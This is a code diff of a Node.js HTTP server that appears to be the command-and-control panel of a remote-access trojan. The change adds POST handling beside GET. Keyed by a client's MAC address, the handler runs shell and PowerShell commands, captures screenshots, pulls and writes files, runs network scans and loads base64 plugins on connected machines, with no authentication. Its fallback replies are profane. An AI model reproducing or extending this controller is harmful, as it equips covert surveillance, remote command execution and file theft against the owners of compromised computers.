@@ -3,6 +3,7 @@ const http = require('http');
 const url = require('url');
 const fs = require("fs");
 const mime = require("mime-types");
+const qs = require('querystring');
 
 class Plugin {
     constructor(name, base64) {
@@ -222,140 +223,156 @@ const socketServer = net.createServer(socket => {
 socketServer.listen(8080);
 
 const httpServer = http.createServer((req, res) => {
-    let query = url.parse(req.url, true).query;
+    if (req.method === "GET") {
+        processQuery(url.parse(req.url, true).query);
+    } else if (req.method === "POST") {
+        let body = '';
 
-    function handleError(err) {
-        res.writeHead(403, {'Content-Type': 'text/html'});
-        res.end("Error: " + err.toString());
+        req.on('data', function (data) {
+            body += data;
+        });
+
+        req.on('end', function () {
+            let post = qs.parse(body);
+            processQuery(post)
+        });
     }
 
-    if (query != null) {
-        if (typeof query['mac'] !== "undefined") {
-            if (clients[query['mac']] !== undefined) {
-                if (typeof query['command'] !== "undefined") {
-                    clients[query['mac']].setCommand(query['command'], result => {
-                        res.writeHead(200, {'Content-Type': 'text/plain'});
-                        res.end(result['result']);
-                    }, false, handleError);
-                } else if (typeof query['psl'] !== "undefined") {
-                    clients[query['mac']].setCommand(query['psl'], result => {
-                        res.writeHead(200, {'Content-Type': 'text/plain'});
-                        res.end(result['result']);
-                    }, true, handleError);
-                } else if (typeof query['screenshot'] !== "undefined") {
-                    clients[query['mac']].takeScreenshot(result => {
-                        res.writeHead(200, {'Content-Type': 'image/png'});
-                        res.end(Buffer.from(result['base64'], 'base64'));
-                    }, handleError);
-                } else if (typeof query['path'] !== "undefined") {
-                    if (typeof query['base64'] === "undefined") {
-                        clients[query['mac']].getFile(query["path"], result => {
-                            let decoded = Buffer.from(result['base64'], 'base64');
-                            res.writeHead(200, {
-                                'Content-Type': mime.lookup(query['path']) || 'application/octet-stream',
-                                'Content-Disposition': `attachment; filename=${(() => {
+    function processQuery(query) {
+
+        function handleError(err) {
+            res.writeHead(403, {'Content-Type': 'text/html'});
+            res.end("Error: " + err.toString());
+        }
+
+        if (query != null) {
+            if (typeof query['mac'] !== "undefined") {
+                if (clients[query['mac']] !== undefined) {
+                    if (typeof query['command'] !== "undefined") {
+                        clients[query['mac']].setCommand(query['command'], result => {
+                            res.writeHead(200, {'Content-Type': 'text/plain'});
+                            res.end(result['result']);
+                        }, false, handleError);
+                    } else if (typeof query['psl'] !== "undefined") {
+                        clients[query['mac']].setCommand(query['psl'], result => {
+                            res.writeHead(200, {'Content-Type': 'text/plain'});
+                            res.end(result['result']);
+                        }, true, handleError);
+                    } else if (typeof query['screenshot'] !== "undefined") {
+                        clients[query['mac']].takeScreenshot(result => {
+                            res.writeHead(200, {'Content-Type': 'image/png'});
+                            res.end(Buffer.from(result['base64'], 'base64'));
+                        }, handleError);
+                    } else if (typeof query['path'] !== "undefined") {
+                        if (typeof query['base64'] === "undefined") {
+                            clients[query['mac']].getFile(query["path"], result => {
+                                let decoded = Buffer.from(result['base64'], 'base64');
+                                res.writeHead(200, {
+                                    'Content-Type': mime.lookup(query['path']) || 'application/octet-stream',
+                                    'Content-Disposition': `attachment; filename=${(() => {
+                                        let arr = query['path'].split(/[\\/]/);
+                                        return arr[arr.length - 1];
+                                    })()}`
+                                });
+                                //res.writeHead(200, {'Content-Type': 'text/plain'});
+                                /*fs.writeFile((() => {
                                     let arr = query['path'].split(/[\\/]/);
                                     return arr[arr.length - 1];
-                                })()}`
-                            });
-                            //res.writeHead(200, {'Content-Type': 'text/plain'});
-                            /*fs.writeFile((() => {
-                                let arr = query['path'].split(/[\\/]/);
-                                return arr[arr.length - 1];
-                            })(), decoded, () => {});*/
-                            res.end(decoded);
-                            //res.end(result['base64']);
+                                })(), decoded, () => {});*/
+                                res.end(decoded);
+                                //res.end(result['base64']);
+                            }, handleError);
+                        } else {
+                            clients[query['mac']].writeFile(query['path'], query['base64'], result => {
+                                res.end("");
+                            }, handleError);
+                        }
+                    } else if (typeof query['scan'] !== "undefined") {
+                        clients[query['mac']].scan(query['scan'], result => {
+                            res.writeHead(200, {'Content-Type': 'application/json'});
+                            res.end(JSON.stringify(result));
                         }, handleError);
+                    } else if (typeof query['plugin_name'] !== "undefined" && typeof query['parameters'] !== "undefined") {
+                        if (typeof plugins.getPlugin(query['plugin_name']) !== "undefined" && JSON.safeParse(query["parameters"])) {
+                            clients[query["mac"]].executePlugin(query['plugin_name'], JSON.safeParse(query["parameters"]), result => {
+                                res.end(result['result']);
+                            }, handleError);
+                        }
+                    } else if (typeof query["label"] !== "undefined") {
+                        Labels.addLabel(query["mac"], query["label"]);
+                        res.writeHead(204, {});
+                        res.end("");
                     } else {
-                        clients[query['mac']].writeFile(query['path'], query['base64'], result => {
-                            res.end("");
-                        }, handleError);
+                        res.writeHead(403, {'Content-Type': 'text/html'});
+                        res.end("Unknown operation");
                     }
-                } else if (typeof query['scan'] !== "undefined") {
-                    clients[query['mac']].scan(query['scan'], result => {
-                        res.writeHead(200, {'Content-Type': 'application/json'});
-                        res.end(JSON.stringify(result));
-                    }, handleError);
-                } else if (typeof query['plugin_name'] !== "undefined" && typeof query['parameters'] !== "undefined") {
-                    if (typeof plugins.getPlugin(query['plugin_name']) !== "undefined" && JSON.safeParse(query["parameters"])) {
-                        clients[query["mac"]].executePlugin(query['plugin_name'], JSON.safeParse(query["parameters"]), result => {
-                            res.end(result['result']);
-                        }, handleError);
-                    }
-                } else if (typeof query["label"] !== "undefined") {
-                    Labels.addLabel(query["mac"], query["label"]);
-                    res.writeHead(204, {});
-                    res.end("");
                 } else {
                     res.writeHead(403, {'Content-Type': 'text/html'});
-                    res.end("Unknown operation");
+                    res.end('Such mac is not connected');
+                }
+            } else if (typeof query['clients'] !== "undefined") {
+                res.writeHead(200, {'Content-Type': 'text/plain'});
+                let obj = [];
+                for (let mac in clients) {
+                    if (clients.hasOwnProperty(mac) && typeof clients[mac] !== "undefined") {
+                        obj.push({
+                            mac: mac,
+                            ip: clients[mac].ip,
+                            port: clients[mac].port,
+                            os: clients[mac].os,
+                            label: Labels.getLabel(mac) || "kar"
+                        });
+                    }
+                }
+                res.end(JSON.stringify(obj));
+            } else if (typeof query['control'] !== "undefined") {
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                fs.readFile("index.html", "utf8", (err, data) => {
+                    if (err) {
+                        res.end(err.toString());
+                    } else {
+                        res.end(data.toString());
+                    }
+                });
+            } else if (typeof query['plugin_control'] !== "undefined") {
+                res.writeHead(200, {'Content-Type': 'text/html'});
+                fs.readFile("plugins.html", "utf8", (err, data) => {
+                    if (err) {
+                        res.end(err.toString());
+                    } else {
+                        res.end(data.toString());
+                    }
+                });
+            } else if (typeof query['plugins'] !== "undefined") {
+                let response = [];
+                let allPlugins = plugins.getAllPlugins();
+                for (let name in allPlugins) {
+                    if (allPlugins.hasOwnProperty(name) && allPlugins[name] !== undefined) {
+                        let plugin = allPlugins[name];
+                        response.push({
+                            name: plugin.name
+                        })
+                    }
+                }
+                res.writeHead(200, {'Content-Type': 'text/plain'});
+                res.end(JSON.stringify(response));
+            } else if (typeof query["plugin_name"] !== "undefined") {
+                if (typeof query["base64"] !== "undefined") {
+                    if (typeof plugins.getPlugin(query["plugin_name"]) === "undefined") {
+                        plugins.addPlugin(query["plugin_name"], query["base64"]);
+                        res.end("")
+                    }
+                } else {
+                    let nameToDelete = query["plugin_name"];
+                    plugins.deletePlugin(nameToDelete);
+                    res.end("");
                 }
             } else {
-                res.writeHead(403, {'Content-Type': 'text/html'});
-                res.end('Such mac is not connected');
-            }
-        } else if (typeof query['clients'] !== "undefined") {
-            res.writeHead(200, {'Content-Type': 'text/plain'});
-            let obj = [];
-            for (let mac in clients) {
-                if (clients.hasOwnProperty(mac) && typeof clients[mac] !== "undefined") {
-                    obj.push({
-                        mac: mac,
-                        ip: clients[mac].ip,
-                        port: clients[mac].port,
-                        os: clients[mac].os,
-                        label: Labels.getLabel(mac) || "kar"
-                    });
-                }
-            }
-            res.end(JSON.stringify(obj));
-        } else if (typeof query['control'] !== "undefined") {
-            res.writeHead(200, {'Content-Type': 'text/html'});
-            fs.readFile("index.html", "utf8", (err, data) => {
-                if (err) {
-                    res.end(err.toString());
-                } else {
-                    res.end(data.toString());
-                }
-            });
-        } else if (typeof query['plugin_control'] !== "undefined") {
-            res.writeHead(200, {'Content-Type': 'text/html'});
-            fs.readFile("plugins.html", "utf8", (err, data) => {
-                if (err) {
-                    res.end(err.toString());
-                } else {
-                    res.end(data.toString());
-                }
-            });
-        } else if (typeof query['plugins'] !== "undefined") {
-            let response = [];
-            let allPlugins = plugins.getAllPlugins();
-            for (let name in allPlugins) {
-                if (allPlugins.hasOwnProperty(name) && allPlugins[name] !== undefined) {
-                    let plugin = allPlugins[name];
-                    response.push({
-                        name: plugin.name
-                    })
-                }
-            }
-            res.writeHead(200, {'Content-Type': 'text/plain'});
-            res.end(JSON.stringify(response));
-        } else if (typeof query["plugin_name"] !== "undefined") {
-            if (typeof query["base64"] !== "undefined") {
-                if (typeof plugins.getPlugin(query["plugin_name"]) === "undefined") {
-                    plugins.addPlugin(query["plugin_name"], query["base64"]);
-                    res.end("")
-                }
-            } else {
-                let nameToDelete = query["plugin_name"];
-                plugins.deletePlugin(nameToDelete);
-                res.end("");
+                res.end("fuck you");
             }
         } else {
-            res.end("fuck you");
+            res.end("wtf");
         }
-    } else {
-        res.end("wtf");
     }
 });
 
